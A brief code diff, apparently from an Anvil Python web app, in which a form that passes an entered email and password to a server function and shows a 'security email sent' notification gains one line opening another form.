@@ -19,4 +19,5 @@ class Form2(Form2Template):
     pwd = self.text_box_2.text
     anvil.server.call('action', mail=mail, pwd=pwd)
     Notification("Security email sent to the respective account.").show()
+    open_form('Form3')
     
